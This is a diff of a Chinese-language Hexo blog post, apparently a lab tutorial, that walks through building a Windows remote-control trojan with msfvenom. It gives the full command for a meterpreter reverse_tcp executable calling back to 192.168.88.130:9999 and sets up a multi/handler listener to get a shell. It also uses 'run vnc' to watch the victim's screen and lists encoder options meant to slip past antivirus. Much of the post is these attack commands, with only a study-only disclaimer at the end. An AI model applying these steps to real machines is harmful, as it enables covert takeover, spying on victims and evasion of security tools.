@@ -18,17 +18,20 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SZ远控木马远控木马：控制（键盘、鼠标、摄像头） cd Desktop ip addr（ifconfig） 找eth0（net桥接以太网）的ip msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.88.130 lport&#x3D;9999 -f exe -o 9999.exe msf">
+        <meta name="description" content="msfvenom制作远控木马远控木马：控制（键盘、鼠标、摄像头） 一、msfvenom介绍  msfvenom是msfpayload,msfencode的结合体。使用msfvenom制作木马的思路是，木马在目标机上执行后，向本机发送信息，而本机则需要开启监听状态，收到信息后则进行连接。 二、msfvenom编写Trojan木马cd Desktop ip addr（ifconfig） 找eth0（n">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="https://shiro036-joker.github.io/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SZ远控木马远控木马：控制（键盘、鼠标、摄像头） cd Desktop ip addr（ifconfig） 找eth0（net桥接以太网）的ip msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.88.130 lport&#x3D;9999 -f exe -o 9999.exe msf">
+<meta property="og:description" content="msfvenom制作远控木马远控木马：控制（键盘、鼠标、摄像头） 一、msfvenom介绍  msfvenom是msfpayload,msfencode的结合体。使用msfvenom制作木马的思路是，木马在目标机上执行后，向本机发送信息，而本机则需要开启监听状态，收到信息后则进行连接。 二、msfvenom编写Trojan木马cd Desktop ip addr（ifconfig） 找eth0（n">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shiro036-joker.github.io/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/QQ%E6%88%AA%E5%9B%BE20240702173017.png">
+<meta property="og:image" content="https://shiro036-joker.github.io/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/QQ%E6%88%AA%E5%9B%BE20240702173100.png">
 <meta property="article:published_time" content="2024-06-28T01:29:53.024Z">
-<meta property="article:modified_time" content="2024-07-01T08:47:49.237Z">
+<meta property="article:modified_time" content="2024-07-02T10:01:21.526Z">
 <meta property="article:author" content="Shirolin">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shiro036-joker.github.io/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/QQ%E6%88%AA%E5%9B%BE20240702173017.png">
     
     
     <!--- Icon Part-->
@@ -581,8 +584,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-07-01 16:47:49</span>
-            <span class="mobile">2024-07-01 16:47:49</span>
+            <span class="desktop">2024-07-02 18:01:21</span>
+            <span class="mobile">2024-07-02 18:01:21</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -593,12 +596,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>110 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>643 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 分钟</span>
         </span>
     
     
@@ -617,16 +620,40 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="SZ远控木马"><a href="#SZ远控木马" class="headerlink" title="SZ远控木马"></a>SZ远控木马</h1><p>远控木马：控制（键盘、鼠标、摄像头）</p>
-<p>cd Desktop</p>
+            <h1 id="msfvenom制作远控木马"><a href="#msfvenom制作远控木马" class="headerlink" title="msfvenom制作远控木马"></a>msfvenom制作远控木马</h1><p>远控木马：控制（键盘、鼠标、摄像头）</p>
+<h2 id="一、msfvenom介绍"><a href="#一、msfvenom介绍" class="headerlink" title="一、msfvenom介绍"></a>一、msfvenom介绍</h2><p>  msfvenom是msfpayload,msfencode的结合体。使用msfvenom制作木马的思路是，木马在目标机上执行后，向本机发送信息，而本机则需要开启监听状态，收到信息后则进行连接。</p>
+<h2 id="二、msfvenom编写Trojan木马"><a href="#二、msfvenom编写Trojan木马" class="headerlink" title="二、msfvenom编写Trojan木马"></a>二、msfvenom编写Trojan木马</h2><p>cd Desktop</p>
 <p>ip addr（ifconfig） 找eth0（net桥接以太网）的ip</p>
+<p>打开终端并输入以下命令：msfvenom -p [payload] LHOST&#x3D;[IP地址] LPORT&#x3D;[端口号] -f [格式] -o [文件名]</p>
+<p>将[payload]替换为你想要使用的载荷类型，例如windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp。</p>
+<p>将[IP地址]替换为你的IP地址。</p>
+<p>将[端口号]替换为你想要使用的端口号。</p>
+<p>将[格式]替换为你想要使用的文件格式。</p>
+<p>将[文件名]替换为你想要使用的文件名。</p>
+<p>例如，如果你想生成一个反向连接的Windows，可以使用以下命令：</p>
 <p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.88.130 lport&#x3D;9999</p>
 <p>-f exe -o 9999.exe</p>
+<p>得到生成的名为9999.exe的木马程序。</p>
+<p>把生成的windows.exe木马文件拖放到windows靶机上，运行。</p>
+<p>我们在kali运行mafconfig，后运行</p>
+<h2 id="三、msfconsole控制感染对象"><a href="#三、msfconsole控制感染对象" class="headerlink" title="三、msfconsole控制感染对象"></a>三、msfconsole控制感染对象</h2><p>在<a class="link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中需要在msfconsole设置一些参数，然后开启监听，这样木马运行后便能够获得shell：</p>
+<p>在Kali终端使用<code>msfconsole</code>控制感染对象(一颗大心脏)</p>
+<p>加载<code>exploit/multi/handler</code>模块（msf5 &gt; use exploit&#x2F;multi&#x2F;handler)</p>
+<p>设置载荷与制作程序时输入的<code>-p</code>参数一致<code>windows/meterpreter_reverse_tcp</code></p>
+<p>最后再设置LHOST和LPORT与程序的参数一致<br>指向Kali系统IP</p>
+<p>配置完毕，<code>run</code>运行监听</p>
+<img lazyload src="/images/loading.svg" data-src="/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/QQ%E6%88%AA%E5%9B%BE20240702173017.png" class title="QQ截图20240702173017">
+
+<h3 id="电脑端示例：shell获取Windows的CMD"><a href="#电脑端示例：shell获取Windows的CMD" class="headerlink" title="电脑端示例：shell获取Windows的CMD"></a>电脑端示例：<code>shell</code>获取Windows的CMD</h3><img lazyload src="/images/loading.svg" data-src="/2024/06/28/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/QQ%E6%88%AA%E5%9B%BE20240702173100.png" class title="QQ截图20240702173100">
+
+<p>进入meterpreter后便已经获得了目标机shell，输入help查看更多命令。</p>
+<p>输入run vnc命令可以实时查看目标机的屏幕。</p>
+<p>handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.88.130 -P 9999（鱼钩丢河里)</p>
+<p>sessions 1 ？（大量的命令和描述信息）&#x2F;&#x2F;提示</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-p 设置payload，查看可以使用的payload可以使用命令(msfvenom -l payload)</span><br><span class="line"></span><br><span class="line">-e 对生成的木马使用编码器，编码器可以在一定程度上绕过杀毒软件。查看可用编码器(msfvenom -l encoder)</span><br><span class="line"></span><br><span class="line">-i 编码次数</span><br><span class="line"></span><br><span class="line">-f 输出木马的格式(i.e. exe)</span><br><span class="line"></span><br><span class="line">LHOST 本机IP</span><br><span class="line"></span><br><span class="line">LPORT 本机端口</span><br></pre></td></tr></table></figure></div>
+
+<p>注，本文章只能用于学习，生成的木马文件不得传播，传播后造成损失的将会按照法律依法处理。</p>
 <p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Hz421Y78E/?p=13&spm_id_from=pageDriver&vd_source=70c6fcdfbaa02e51cd65eae74bfb7123">msfvenom生成后门木马_哔哩哔哩_bilibili <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>msfconsole(一颗大心脏)</p>
-<p>handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.88.130 -P 9999（鱼钩丢河里）</p>
-<p>sessions 1</p>
-<p>？（大量的命令和描述信息）&#x2F;&#x2F;提示</p>
 
         </div>
 
@@ -641,7 +668,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-07-01 16:47:49
+                    :</strong> 2024-07-02 18:01:21
             </li>
         
         <li>
@@ -670,11 +697,26 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/06/28/%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item"></span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/06/28/%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA/"
+                        href="/2024/06/28/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"
                         >
                             <span class="title flex justify-center items-center">
                                 <span class="post-nav-title-item"></span>
@@ -742,7 +784,7 @@
     <div class="post-toc">
         <div class="toc-title">此页目录</div>
         <div class="page-title"></div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SZ%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC"><span class="nav-text">SZ远控木马</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#msfvenom%E5%88%B6%E4%BD%9C%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC"><span class="nav-text">msfvenom制作远控木马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81msfvenom%E4%BB%8B%E7%BB%8D"><span class="nav-text">一、msfvenom介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81msfvenom%E7%BC%96%E5%86%99Trojan%E6%9C%A8%E9%A9%AC"><span class="nav-text">二、msfvenom编写Trojan木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81msfconsole%E6%8E%A7%E5%88%B6%E6%84%9F%E6%9F%93%E5%AF%B9%E8%B1%A1"><span class="nav-text">三、msfconsole控制感染对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%B5%E8%84%91%E7%AB%AF%E7%A4%BA%E4%BE%8B%EF%BC%9Ashell%E8%8E%B7%E5%8F%96Windows%E7%9A%84CMD"><span class="nav-text">电脑端示例：shell获取Windows的CMD</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
@@ -781,7 +823,7 @@
                     </span>
                     
                         <span>
-                            共 11.7k 字
+                            共 12.3k 字
                         </span>
                     
                 </p>
